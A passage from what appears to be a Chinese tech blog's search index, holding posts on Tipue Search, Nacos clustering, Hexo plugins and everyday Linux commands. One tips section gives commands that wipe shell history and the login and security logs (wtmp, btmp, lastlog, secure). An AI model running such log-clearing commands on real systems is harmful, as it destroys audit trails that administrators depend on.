的自动补全功能，只需在 input 标签内添加 list 属性和在页面中添加 datalist 标签即可。特别注意：list 属性的值必须与 datalist 标签的 ID 值一致。 12345678910111213&lt;form&gt; &lt;div class="tipue_search_group"&gt; &lt;input type="text" name="q" id="tipue_search_input" pattern=".{3,}" title="At least 3 characters" list="search" autocomplete="off" autofocus="autofocus" required&gt;&lt;button type="submit" class="tipue_search_button"&gt;&lt;div class="tipue_search_icon"&gt;&amp;#9906;&lt;/div&gt;&lt;/button&gt; &lt;/div&gt;&lt;/form&gt;&lt;datalist id="search"&gt; &lt;option&gt;jQuery&lt;/option&gt; &lt;option&gt;Support&lt;/option&gt; &lt;option&gt;Tipr&lt;/option&gt; &lt;option&gt;Tipue&lt;/option&gt; &lt;option&gt;Tipue Search&lt;/option&gt;&lt;/datalist&gt; Tipue Search 常用参数Tipue Search 默认只支持搜索整个英文单词，若想支持中文搜索，必须设置参数： \'wholeWords\': false，其他常用参数的说明如下： 123456789$(\'#tipue_search_input\').tipuesearch({ \'show\': 10, // 每页显示的最大搜索记录数，默认值：10 \'showURL\': false, // 是否将URL显示在每个搜索结果中，默认值：true \'newWindow\': true, // 点击搜索结果时是否在新的浏览器选项卡中打开页面，默认值：false \'footerPages\': 10, // 页脚中显示的最大页面选择数，默认值：3 \'minimumLength\': 3, // 搜索关键字中最小的字符长度，默认值：3 \'wholeWords\': false, // 是否不使用英语以外的其他语言，默认值：true \'showTitleCount\': false // 是否将搜索结果的数量显示在浏览器选项卡的标题中，默认值：true }); Tipue Search 的特性 Tipue Search 7.1 依赖 JQuery-2.2.4，官方推荐使用 JQuery-3.x，实测使用低版本的 JQuery-1.11.0 也可以正常运行 Tipue Search 不同版本之间最本质的区别是：新版的数据文件是 JS 文件，旧版的数据文件是 JSON 文件，两者互不兼容 Tipue Search 7.1 默认的数据文件名为：tipuesearch_content.js，Tipue Search 旧版本的数据文件名则为：tipuesearch_content.json Tipue Search 支持包括：Chrome 49+，Edge 16+， IE10+， Firefox 58+， Safari 11+， iOS Safari 10.3+， Chrome for Android 66+， Samsung Internet 4+ 等现代浏览器 最终搜索效果图 Tipue Search Preview 参考资料 Tipue Search 官网 Hexo-Tipue-Search-Json 插件 Hexo-Generator-SearchDB 插件 分享几个实用的 Hexo 博客功能插件 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"静态博客"},{title:"Nacos 入门教程 - 配置管理高级篇",url:"/posts/cc563108.html",text:'上篇 - Nacos 入门教程 - 配置管理（中级篇） Nacos 入门教程 - 配置管理中级篇 Nacos Server 集群部署模式Nacos Server 支持三种部署模式： 单机模式 - 用于测试和单机试用 集群模式 - 用于生产环境，确保高可用 多集群模式 - 用于多数据中心场景 集群搭建安装 Nacos Server 集群环境下，至少需要安装三台以上的 Nacos Server，一般情况下复制三份 Nacos Server 解压后的文件夹即可，分别命名为 nacos-1、nacos-2、nacos-3。 配置 IP 与 端口 若是单机搭建 Nacos Server 集群，则需要更改每台 Nacos Server 目录的 conf 目录下的 application.properties 配置文件，通过 server.port 参数让每台 Nacos Server 使用不同的端口，以此来避免端口冲突。 在生产环境中，若每台 Nacos Sever 都有独立的真实 IP 地址，或者单台 Nacos Server 拥有多块网卡时，则需要在每台 Nacos Server 目录的 conf 目录下的 application.properties 配置文件里通过 nacos.inetutils.ip-address 参数绑定真实的 IP 地址。 12server.port=8848nacos.inetutils.ip-address=192.168.1.124 配置集群配置文件 在所有 Nacos Server 目录的 conf 目录下找到 cluster.conf.example 配置文件，将其重命名为 cluster.conf，并将所有 Nacos Server 的 IP 地址以 ip:port 的格式写到配置文件里，配置示例如下： 特别注意：这里的 IP 不能写 127.0.0.1，必须是 Linux 命令 hostname -i 能够识别的 IP 123192.168.1.124:8848 # Nacos Server 1192.168.1.124:8849 # Nacos Server 2192.168.1.124:8850 # Nacos Server 3 配置 MySQL 数据源 Nacos Server 默认使用嵌入式数据库实现数据的存储，若直接启动多个默认配置下的 Nacos Server 节点，数据存储会存在一致性的问题。为了解决这个问题，Nacos Server 采用了集中存储的方式来支持集群化部署，目前只支持 MySQL 的存储（5.6.5+）。由于前面的教程已经介绍过 Nacos Server 如何配置 MySQL 数据源，这里不再累述。值得一提的是，每台 Nacos Server 都需要单独配置 MySQL 数据源。 集群模式下启动 启动 Nacos Server 集群，需要分别在每台 Nacos Server 目录的 bin 目录下执行启动脚本 123$ sh nacos-1/bin/startup.sh$ sh nacos-2/bin/startup.sh$ sh nacos-3/bin/startup.sh 若每台 Nacos Server 在启动时输出以下日志信息，说明 Nacos Server 是以集群模式启动了 12nacos is starting with clusternacos is starting，you can check the /nacos-x/logs/start.out 集群模式下关闭 若希望关闭 Nacos Server 集群，同样分别在每台 Nacos Server 目录的 bin 目录下执行关闭脚本即可 123$ sh nacos-1/bin/shutdown.sh$ sh nacos-2/bin/shutdown.sh$ sh nacos-3/bin/shutdown.sh Spring Cloud 配置 Nacos Server 集群 1234567spring: application: name: service cloud: nacos: config: server-addr: 192.168.1.124:8848,192.168.1.124:8849,192.168.1.124:8850 # 当不使用Nginx作为负载均衡服务时，可以直接填写多个Nacos Server节点的IP 集群启动失败解决方法 若机器不能同时启动三个 Nacos Server 实例，建议检查是否内存不够，此时可以在每台 Nacos Server 目录的 bin 目录下的 startup.sh 启动脚本里适当调整 JVM 的内存参数 12$ vim startup.shJAVA_OPT="${JAVA_OPT} -server -Xms2g -Xmx2g -Xmn1g -XX:MetaspaceSize=128m -XX:MaxMetaspaceSize=320m" 集群部署架构（高可用）多种部署模式 http://ip1:port/openAPI 直连 IP 模式，机器宕机则需要修改 IP 才可以使用 http://VIP:port/openAPI 挂载 VIP 模式，直连 VIP 即可，下面挂载 Server 真实 IP，可读性不好 http://nacos.com:port/openAPI 域名 + VIP 模式，可读性好，而且换 IP 方便，当 Nacos 集群迁移时客户端也无需修改，推荐使用此模式，部署架构图如下图所示： Nginx 反向代理配置在 Nacos Server 的集群启动完毕之后，根据上面的部署架构图所示，还需要提供一个统一的入口给 Spring Cloud 应用访问。简单地说，就是需要为上面启动的的三个 Nacos Server 节点做一个可以为它们实现负载均衡的访问点。这个实现的方式非常多，可以考虑使用 Nginx 来实现，配置示例如下。特别注意，考虑到 Nginx 的高可用性，建议使用 Nginx + Keepalive 来搭建 Nginx 集群。 123456789101112131415upstream nacos { server 192.168.1.124:8848; server 192.168.1.124:8849; server 192.168.1.124:8850;}server { listen 80; server_name nacos.a-hh.cn; location / { proxy_pass http://nacos; }} MySQL 数据库高可用在 Nacos Server 集群模式下，当采用 MySQL 作为外置数据源时，为了确保数据库的高可用性，在生产环境下建议 MySQL 至少使用主备模式，或者采用高可用数据库。可通过修改 ${nacos-home}/conf/application.properties 配置文件，让 Nacos Server 拥有多个数据源，配置示例如下： 1234567spring.datasource.platform=mysqldb.num=1db.url.0=jdbc:mysql://192.168.1.1:3306/nacos_config?characterEncoding=utf8&amp;connectTimeout=1000&amp;socketTimeout=3000&amp;autoReconnect=true&amp;useUnicode=true&amp;useSSL=false&amp;serverTimezone=UTCdb.url.1=jdbc:mysql://192.168.1.2:3306/nacos_config?characterEncoding=utf8&amp;connectTimeout=1000&amp;socketTimeout=3000&amp;autoReconnect=true&amp;useUnicode=true&amp;useSSL=false&amp;serverTimezone=UTCdb.user=rootdb.password=123456 特别注意：若 MySQL 配置了主从库（主从同步），当主库宕机后，切换到从库，此时切到从库后会导致主库的数据比从库少，即会出现数据不一致的问题。 集群高可用部署架构图 多集群模式Nacos Server 支持 NameServer 路由请求模式，通过它可以设计一个有用的映射规则来控制请求转发到相应的集群，在映射规则中可以按命名空间或租户等分片请求。 多网卡 IP 选择 当本地环境比较复杂的时候，Nacos 服务在启动的时候需要选择运行时使用的 IP 或者网卡。Nacos Server 从多网卡获取 IP 参考了 Spring Cloud 设计，通过 nacos.inetutils 参数，可以指定 Nacos 使用的网卡和 IP 地址，目前支持的配置参数有： ip-address 参数可以直接设置 Nacos 的 IP 1nacos.inetutils.ip-address=10.11.105.155 use-only-site-local-interfaces 参数可以让 Nacos 使用局域网 IP，这个在 Nacos 部署的机器有多网卡时很有用，可以让 Nacos 选择局域网网卡 1nacos.inetutils.use-only-site-local-interfaces=true ignored-interfaces 支持网卡数组，可以让 Nacos 忽略多个网卡 12- nacos.inetutils.ignored-interfaces[0]=eth0- nacos.inetutils.ignored-interfaces[1]=eth1 preferred-networks 参数可以让 Nacos 优先选择匹配的 IP，支持正则匹配和前缀匹配 12nacos.inetutils.preferred-networks[0]=30.5.124.nacos.inetutils.preferred-networks[0]=30.5.124.(25[0-5]|2[0-4]\\\\d|((1d{2})|([1-9]?\\\\d))),30.5.124.(25[0-5]|2[0-4]\\\\d|((1d{2})|([1-9]?\\\\d))) var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"微服务"},{title:"Hexo 插件开发",url:"/posts/f30bc89b.html",text:'Hexo 官方教程 普通插件开发 标签插件开发 已开发插件的列表 hexo-pdf-better，Hexo PDF 插件 hexo-site-auth，Hexo 站点验证插件 hexo-google-adsense，Hexo 谷歌广告插件 hexo-admonition-better，Hexo 内容辅助插件 hexo-tipue-search-db，Hexo 全文静态搜索插件 hexo-lazyload-image-better，Hexo 图片懒加载插件 hexo-waline-next，适用于 NexT 主题的 Waline 评论插件 hexo-next-darkmode，适用于 NexT 主题的暗黑模式切换插件 hexo-generator-sogou-sitemap，Hexo 生成搜狗站点地图的插件 hexo-readmore，Hexo 阅读更多插件，将将博客流量导流到微信公众号 发布插件到 Hexo 官网当完成插件的开发后，可以考虑将它发布到 Hexo 的插件列表，让更多人能够使用自己开发的插件，其中发布插件的步骤（如下所示）和 Hexo 更新文档非常类似。 Fork hexojs/site 仓库 将已 Fork 的仓库 Clone 到本地磁盘，并安装所依赖的插件 123$ git clone https://github.com/&lt;username&gt;/site.git$ cd site$ npm install 编辑 source/_data/plugins.yml 文件，新增自己的插件，例如： 1234567- name: hexo-next-darkmode description: Add Darkmode for NexT theme link: https://github.com/rqh656418510/hexo-next-darkmode tags: - next - darkmode - nightmode 可以通过 Hexo 启动服务器预览变动 1$ hexo server 推送（Push）代码 12$ cd site$ git push orign master 在 Github 建立一个新的合并申请（Pull Request）并描述改动 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"静态博客 前端"},{title:"日常编程开发技巧之二",url:"/posts/eb118fe2.html",text:'Centos 7 卸载系统自带的 NodeJs 123456789101112131415# 查看已安装的npm# rpm -qa|grep npm# 查看已安装的nodejs# rpm -qa|grep nodejs# 卸载# yum -y remove nodejs npm# 删除残留文件# rm -rf ~/.npm# rm -rf ~/.npmrc# rm -f /usr/bin/npm# rm -f /usr/bin/node# rm -rf /usr/lib/node_modules Linux 批量替换文件内容 12345678910111213# 命令格式：sed -i "s/查找字段/替换字段/g" `grep 查找字段 -rl 路径`# 为了不区分大小写匹配搜索，可以使用 I 参数$ sed \'s/unix/linux/gI\' sed-test.txt# 将当前目录下所有文件中的字符串oldstring替换为newstring$ sed -i "s/oldstring/newstring/g" `ls`# 查找当前目录下所有后缀为md的文件，并将文件中的字符串oldstring替换为newstring$ sed -i "s/oldstring/newstring/g" `find . -name "*.md"`# 当搜索和替换含分隔符的字符串时，需要用反斜杠 \\ 来取消转义$ sed "s/\\/bin\\/bash/\\/usr\\/bin\\/fish/g" sed-test.txt Linux 删除文件中的某行内容 12345# 删除文件中的某行内容$ sed -i \'/hello/d\' abc.txt# 查找当前目录下所有后缀为txt的文件，并批量删除文件中的某行内容$ find . -type f -iname "*.txt" | xargs -I {} sed -i \'/hello/d\' {} Linux 批量替换文件名中的字符串 12345678910111213141516# 假设原文件名是“stu_102999_5_finished.jpg”，需要替换字符串"_finished"为""空字符串# 方法一：使用rename改名(支持中文特殊字符的替换)$ rename "_finished" "" *.jpg# 使用rename批量改名$ find . -name "*.avi" | xargs -I {} rename "xxx" "" {}# 方法二：for循环结合sed替换$ for file in `ls *.jpg`;do mv $file `echo $file|sed \'s/_finished//g\'`;done;# 方法三：for循环加变量部分截取$ for file in `ls *.jpg`;do mv $file `echo ${file%_finished*}.jpg`;done;# 方法四：ls结合awk，输出交给bash执行$ ls *.jpg |awk -F "_finished" \'{print "mv "$0" "$1$2""}\'|bash Linux 搜索文件里面的内容 1234567891011121314# 在单个文件中搜索内容，区分大小写$ grep \'keyword\' filename# 在单个文件中搜索内容，忽略区分大小写$ grep -i \'keyword\' filename# 在多个文件中搜索内容，忽略区分大小写$ grep -i \'keyword\' filename1 filename2 filename3# 搜索一个目录下所有文件里面的内容，忽略区分大小写$ find . -type f -name "*" | xargs grep -i "keyword"# 搜索一个目录下后缀为 .properties 的文件里面的内容，忽略区分大小写$ find . -type f -name "*.properties" | xargs grep -i "keyword" FFmpeg 常用命令 12345# 将flv格式的视频转换为mp4格式$ ffmpeg -i xxxxx.flv xxxxx.mp4# 按时间戳截取视频片段$ ffmpeg -i ./SN.mp4 -vcodec copy -acodec copy -ss 00:00:00 -to 00:00:05 ./cutout1.mp4 -y Hexo 创建草稿 12345678910111213# 创建草稿，默认会在source/_drafts目录下生成first-draft.md文件$ hexo new draft "first-draft"# 提示：草稿不会被显示在任何页面上，链接也访问不到，也就是说如果想把某一篇文章移除显示，又不舍得删除，可以尝试把它移动到source/_drafts目录之中# 如果希望强行预览草稿，可以更改_config.yml配置文件中的以下参数render_drafts: true# 或者，使用如下方式启动server后预览草稿$ hexo server --drafts# 将草稿转成正式文章$ hexo publish "first-draft" Linux 压缩 Jpeg 图片 1234567891011# 安装软件# yum install -y jpegoptim# 指定图片压缩后的大小$ jpegoptim --size=520k pic.jpeg# 指定图片压缩质量$ jpegoptim -m80 pic.jpg --dest pic-2.jpg# 批量压缩图片$ find . -name "*.jpg" | xargs jpegoptim Linux 压缩 Png 图片 12345# 安装软件# yum install -y optipng# 压缩图片$ optipng pic.png -out pic-2.png https://github.com/bugwhine/lookbusy 卸载 UrBackup 服务 12345678910111213141516171819202122232425# 提示：UrBackup的服务之前是通过手动编译的方式来安装# 查找UrBackup的自启动服务# systemctl list-unit-files --type=service | grep enabled | grep urbackup# 停止UrBackup的自启动服务# systemctl stop urbackup-server.service# systemctl disable urbackup-server.service# 删除UrBackup的日志文件# rm -rf /var/log/urbackup.log# 删除UrBackup的安装文件# rm -rf /usr/local/var/urbackup# rm -rf /usr/local/share/urbackup# rm -rf /usr/local/bin/urbackupsrv# 删除UrBackup的配置文件# rm -rf /etc/default/urbackupsrv# rm -rf /etc/logrotate.d/urbackupsrv# rm -rf /etc/systemd/system/urbackup-server.service# 查漏补缺，将搜索到的文件全部删除掉# find / -type d -iname \'urbackup\'# find / -type f -iname \'urbackupsrv\' Github 搜索技巧 Github 官方的搜索语法介绍，常用搜索示例如下，当同时使用多个搜索参数时，使用” 空格” 符隔开不同的参数 in:name spring // 搜索名字中带有”spring” 的项目 in:readme spring // 搜索 readme 中带有”spring” 的项目 in:description spring // 搜索描述中带有”spring” 的项目 stars:&gt;1000 // 搜索 stars&gt;1000 的项目 forks:&gt;1000 // 搜索 forks&gt;1000 的项目 pushed:&gt;2020-01-15 // 搜索最近更新于 2020 年 1 月 15 日之后的项目 language:Python // 搜索 Python 的项目 Linux 查看硬盘转数 1234567891011121314151617# 下载sg3_utils工具的压缩包，官网地址：http://sg.danny.cz/sg/sg3_utils.html# wget http://sg.danny.cz/sg/p/sg3_utils-1.45.tar.xz# 解压文件# tar -xvf sg3_utils-1.45.tar.xz# 进入解压目录# cd sg3_utils-1.45# 编译安装# ./configure# make &amp;&amp; make install# 查看硬盘转数$ sg_vpd --page=0xb1 /dev/sdeNominal rotation rate: 7200 rpmNominal form factor: 3.5 inch Linux 使用 Sysbench 进行压测 常用的压测工具：ab、stress、sysbench、webbench、jmeter。 1234567891011121314151617181920212223# 压测CPU性能（单核、四核、八核）$ sysbench --test=cpu --num-threads=1 --max-requests=10000 run$ sysbench --test=cpu --num-threads=4 --max-requests=100000 run$ sysbench --test=cpu --num-threads=8 --max-requests=100000 run# 压测CPU性能（单核、四核、八核），cpu-max-prime 是素数生成数量的上限，threads 是线程数，time 是运行的时间（秒），event 是达到上限的次数（默认值为0，表示不限制上限次数）$ sysbench cpu --cpu-max-prime=20000 --threads=1 --time=10 run$ sysbench cpu --cpu-max-prime=20000 --threads=4 --time=10 run$ sysbench cpu --cpu-max-prime=20000 --threads=8 --time=10 run# 压测内存性能（随机读写、连续读写）$ sysbench --test=memory --memory-block-size=1K --memory-total-size=1G --memory-access-mode=rnd run$ sysbench --test=memory --memory-block-size=1K --memory-total-size=1G --memory-access-mode=seq run# 压测八线程的共享线程锁$ sysbench --test=threads --num-threads=1000 --thread-yields=1000 --thread-locks=8 run# 压测互斥锁$ sysbench --test=mutex --mutex-num=4096 --mutex-locks=50000 --mutex-loops=10000 run# 压测磁盘IO（随机读写、连续读写）$ sysbench --test=fileio --file-num=2 --file-total-size=64M --file-test-mode=rndwr run$ sysbench --test=fileio --file-num=2 --file-total-size=64M --file-test-mode=seqrewr run CRT 格式证书转为 PEM 格式证书 1$ openssl x509 -in example.com.crt -out example.com.pem -outform PEM 系统端口号冲突排查 123456# 查看当前系统各服务占用的端口号# netstat -lntup# 查看占用8080端口的服务# netstat -anp|grep 8080# netstat -aon|grep 8080 Centos 6、7 的服务类相关命令 Centos 6 注册在系统中的标准化程序 统一的管理方式（常用方法） service 服务名 start service 服务名 stop service 服务名 restart service 服务名 status 查看服务的方法： /etc/init.d/服务名 通过 chkconfig 命令管理服务自启动 查看自启动的服务： chkconfig --list|grep xxx 启用服务自启动： chkconfig --level 5 服务名 on 关闭服务自启动： chkconfig --level 5 服务名 off Centos 7 注册在系统中的标准化程序 统一的管理方式（常用方法） systemctl start 服务名（xxx.service） systemctl stop 服务名（xxx.service） systemctl restart 服务名（xxx.service） systemctl reload 服务名（xxx.service） systemctl status 服务名（xxx.service） 查看服务的方法： /usr/lib/systemd/system/服务名 查看服务的命令 systemctl list-unit-files | grep service_name systemctl --type service | grep service_name 通过 systemctl 命令管理服务自启动 启用服务自启动： systemctl enable service_name 关闭服务自启动： systemctl disable service_name Centos7 管理不同版本的 JDK /etc/alternatives/ 目录存放着系统默认命令的链接符，而 update-alternatives 是 Linux 系统中专门维护系统命令链接符的工具，通过它可以很方便地设置系统默认使用哪个命令、哪个软件版本。例如，在系统中同时安装了 Open JDK 和 Oracle JDK（两者都通过 RPM 包安装），而实际又希望系统默认使用的是 Oracle JDK，此时就可以通过 update-alternatives 很方便地实现。当执行以下命令后，根据输出的提示信息，直接输入希望被系统默认使用的选项的编号即可；命令执行完后，可以看到 /etc/alternatives/ 目录下 Java 相关的链接符发生了改变。 1234567891011# update-alternatives --config java共有 3 个提供“java”的程序。 选项 命令----------------------------------------------- 1 /usr/java/jdk1.8.0_102/jre/bin/java 2 java-1.8.0-openjdk.x86_64 (/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.272.b10-1.el7_9.x86_64/jre/bin/java)*+ 3 /usr/java/jdk-11.0.9/bin/java按 Enter 保留当前选项[+]，或者键入选项编号： 特别注意的是，如果 JDK 是通过解压的方式来安装的（非 RPM 包安装），那么就只能通过手动配置系统的 JDK 环境变量来替代 update-alternatives 命令的功能，具体可以参考以下配置： 12345678910# 编辑配置文件，添加对应的JDK环境变量# vim /etc/profileJAVA_HOME=/usr/java/jdk1.8.0_102JRE_HOME=/usr/java/jdk1.8.0_102/jrePATH=$PATH:$JAVA_HOME/bin:$JRE_HOME/binCLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar:$JRE_HOME/libexport JAVA_HOME JRE_HOME PATH CLASSPATH# 使配置文件生效# source /etc/profile Debian 9（Stretch）更换阿里云镜像源 1234567891011121314# 方法一：不依赖任何文本编辑器# 备份# cp /etc/apt/sources.list /etc/apt/backup.sources.list# 将配置信息写入文件# echo "deb http://mirrors.aliyun.com/debian/ stretch main non-free contrib" &gt; /etc/apt/sources.list# echo "deb-src http://mirrors.aliyun.com/debian/ stretch main non-free contrib" &gt;&gt; /etc/apt/sources.list# echo "deb http://mirrors.aliyun.com/debian-security stretch/updates main" &gt;&gt; /etc/apt/sources.list# echo "deb-src http://mirrors.aliyun.com/debian-security stretch/updates main" &gt;&gt; /etc/apt/sources.list# echo "deb http://mirrors.aliyun.com/debian/ stretch-updates main non-free contrib" &gt;&gt; /etc/apt/sources.list# echo "deb-src http://mirrors.aliyun.com/debian/ stretch-updates main non-free contrib" &gt;&gt; /etc/apt/sources.list# echo "deb http://mirrors.aliyun.com/debian/ stretch-backports main non-free contrib" &gt;&gt; /etc/apt/sources.list# echo "deb-src http://mirrors.aliyun.com/debian/ stretch-backports main non-free contrib" &gt;&gt; /etc/apt/sources.list 123456789101112131415161718# 方法二：依赖Vi、Vim等文本编辑器# 备份# cp /etc/apt/sources.list /etc/apt/backup.sources.list# 清空文件内容# echo "" &gt; /etc/apt/sources.list# 添加以下配置信息到文件中# vi /etc/apt/sources.listdeb http://mirrors.aliyun.com/debian/ stretch main non-free contribdeb-src http://mirrors.aliyun.com/debian/ stretch main non-free contribdeb http://mirrors.aliyun.com/debian-security stretch/updates maindeb-src http://mirrors.aliyun.com/debian-security stretch/updates maindeb http://mirrors.aliyun.com/debian/ stretch-updates main non-free contribdeb-src http://mirrors.aliyun.com/debian/ stretch-updates main non-free contribdeb http://mirrors.aliyun.com/debian/ stretch-backports main non-free contribdeb-src http://mirrors.aliyun.com/debian/ stretch-backports main non-free contrib 12345678# 更新软件索引（必须）# apt-get update# 升级系统所有软件（非必须）# apt-get upgrade# 升级系统版本（非必须）# apt-get dist-upgrade Ubuntu 20.4 LTS 更换阿里镜像源 123456789101112131415161718192021# 备份# cp /etc/apt/sources.list /etc/apt/sources.list.bak# 清空文件内容# echo "" &gt; /etc/apt/sources.list# 添加以下配置信息到文件中# vim /etc/apt/sources.listdeb http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse# 更新软件索引# apt-get update Markdown 折叠代码语法 code：指定代码块 details：折叠语法标签 summary：折叠语法展示的摘要 pre：以原有格式显示元素内的文字是已经格式化的文本 Centos7 清除命令历史记录、登录信息 123456# 清除命令历史记录$ echo &gt; .bash_history$ history -cw# 验证清除效果$ history 12345678# 清除登录信息$ sudo sh -c \'echo &gt; /var/log/wtmp\'$ sudo sh -c \'echo &gt; /var/log/btmp\'$ sudo sh -c \'echo &gt; /var/log/lastlog\'$ sudo sh -c \'echo &gt; /var/log/secure\'# 验证清除效果$ last 配置阿里巴巴的 DNS 服务 域名系统（服务）协议（DNS）是一种分布式网络目录服务，主要用于域名与 IP 地址的相互转换，以及控制因特网的电子邮件的发送。在 Linux 服务器上快速配置阿里巴巴 DNS 服务的方法如下： 12345678# 编辑系统配置文件，只需要添加以下两行内容# vim /etc/resolv.confnameserver 223.5.5.5nameserver 223.6.6.6# 重启网络服务# service network restart 模拟 CPU 高负载 Lookbusy 的安装，详见 Lookbusy 官网 1234567891011121314151617# 下载# wget http://www.devin.com/lookbusy/download/lookbusy-1.4.tar.gz# 解压# tar -xvf lookbusy-1.4.tar.gz# 进入解压目录# cd lookbusy-1.4 # 预配置# ./configure# 编译# make -j4# 安装# make install Lookbusy 的使用 1234567891011121314# 让所有CPU核心的使用率都是30%$ lookbusy -c 30# 让两个CPU核心的使用率为30%$ lookbusy -n 2 -c 30# 让所有CPU核心的使用率在60%-70%上下浮动$ lookbusy -c 60-70 -r curve# 让所有CPU核心的使用率在20%-80%之间，周期为24小时，在14点达到峰值$ lookbusy --cpu-mode curve --cpu-curve-peak 14h -c 20-80# 让所有CPU核心的使用率在20%-30%之间，周期为60分钟，在30分钟达到峰值$ lookbusy --cpu-mode curve --cpu-curve-period 60m --cpu-curve-peak 30m -c 20-30 Debian/Ubuntu 安装 GCC 与 G++ build-essential 是 C/C++ 的开发包，包含了 gcc、g++、make、gdb 和 libc 等工具，执行下面的命令安装即可： 1# apt-get -y install build-essential Centos7 更改内核启动顺序 1234567891011121314# 查看当前系统有几个内核# cat /boot/grub2/grub.cfg |grep menuentry # 查看当前系统的默认内核# grub2-editenv list # 更改系统默认的启动内核# grub2-set-default \'CentOS Linux (3.10.0-514.26.2.el7.x86_64) 7 (Core)\'# 重启系统生效# reboot# 重启后查看内核是否已经修改# uname -a var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"linux 开发随笔"},{title:"Nacos 入门教程 - 配置管理中级篇",url:"/posts/35766a62.html",text:'上篇 - Nacos 入门教程 - 配置管理（基础篇） Nacos 入门教程 - 配置管理基础篇 Nacos Config Spring 入门案例1.0、版本说明在本案例中，Spring 的版本为 5.2.x，Nacos Server 的版本为 1.4.0，点击下载完整的案例代码。 1.1、发布配置12345Namespace: publicData ID: nacos_config_spring_demo.propertiesGroup: DEFAULT_GROUP配置格式: Properties配置内容: useLocalCache=true 1.2 、添加 Maven 依赖12345678910111213141516&lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;artifactId&gt;javax.servlet-api&lt;/artifactId&gt; &lt;version&gt;4.0.1&lt;/version&gt; &lt;scope&gt;provided&lt;/scope&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt; &lt;version&gt;5.2.12.RELEASE&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;com.alibaba.nacos&lt;/groupId&gt; &lt;artifactId&gt;nacos-spring-context&lt;/artifactId&gt; &lt;version&gt;1.0.0&lt;/version&gt;&lt;/dependency&gt; 1.3、创建 Nacos 配置类添加 @EnableNacosConfig 注解启用 Nacos Spring 的配置管理服务，其中使用 @NacosPropertySource 加载了 dataId 为 nacos_config_spring_demo.properties 的配置集，并开启自动更新 12345678910111213141516package com.nacos.study.config;import com.alibaba.nacos.api.annotation.NacosProperties;import com.alibaba.nacos.spring.context.annotation.config.EnableNacosConfig;import com.alibaba.nacos.spring.context.annotation.config.NacosPropertySource;import org.springframework.context.annotation.Configuration;/** * @author clay */@Configuration@EnableNacosConfig(globalProperties = @NacosProperties(serverAddr = "127.0.0.1:8848"))@NacosPropertySource(dataId = "nacos_config_spring_demo.properties", autoRefreshed = true)public class NacosConfiguration {} 1.4、创建 Controller 测试类通过 Nacos 的 @NacosValue 注解设置属性值 123456789101112131415161718192021222324package com.nacos.study.controller;import com.alibaba.nacos.api.config.annotation.NacosValue;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestMethod;import org.springframework.web.bind.annotation.ResponseBody;/** * @author clay */@Controller@RequestMapping("/config")public class ConfigController { @NacosValue(value = "${useLocalCache:false}", autoRefreshed = true) private boolean useLocalCache; @ResponseBody @RequestMapping(value = "/get", method = RequestMethod.GET) public boolean get() { return useLocalCache; }} 1.5、配置 web.xml12345678910&lt;servlet&gt; &lt;servlet-name&gt;dispatcherServlet&lt;/servlet-name&gt; &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt; 